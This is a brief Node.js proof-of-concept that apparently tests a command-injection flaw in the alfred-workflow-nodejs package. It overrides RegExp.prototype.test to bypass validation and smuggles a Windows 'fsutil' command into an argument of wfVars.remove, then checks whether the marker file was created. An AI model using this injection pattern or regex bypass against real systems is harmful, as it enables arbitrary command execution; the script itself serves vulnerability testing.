RegExp.prototype.test = () => true;
const AlfredNode = require('alfred-workflow-nodejs');
const fs = require('fs');
const path = './alfred-workflow-nodejs';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
var utils = AlfredNode.utils;
utils.wfVars.remove(`"& fsutil file createnew alfred-workflow-nodejs 0 &`, function () {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
});